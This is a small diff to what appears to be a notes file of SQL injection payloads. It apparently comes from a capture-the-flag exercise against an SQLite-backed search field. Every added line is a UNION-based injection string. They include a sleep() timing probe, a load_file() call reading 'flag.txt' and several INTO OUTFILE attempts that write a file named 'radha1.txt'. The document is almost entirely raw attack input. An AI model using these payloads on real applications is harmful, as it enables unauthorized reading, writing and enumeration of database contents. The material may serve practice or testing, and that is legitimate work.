@@ -127,3 +127,12 @@ FROM (
 ) AS inserted_rows;
 `
 - a%'union select name from (INSERT INTO sqlite_schema(name) VALUES (1729) RETURNING name) /* 
+
+- a%'union select name from sqlite_schema AND sleep(10)/*-500
+- a%'union select name from sqlite_schema into outfile/*
+- a%'union select load_file("flag.txt")/*-500
+- a%'union select name from sqlite_schema into/*
+- a%'union select name from sqlite_schema into outfile "./radha1.txt"/* -500
+- a%'union select name from sqlite_schema into outfile "radha1.txt"/*-500
+- a%'union select name from sqlite_schema into outfile 'radha1.txt'/*-500
+- a%'union select name from sqlite_schema into outfile './radha1.txt'/*
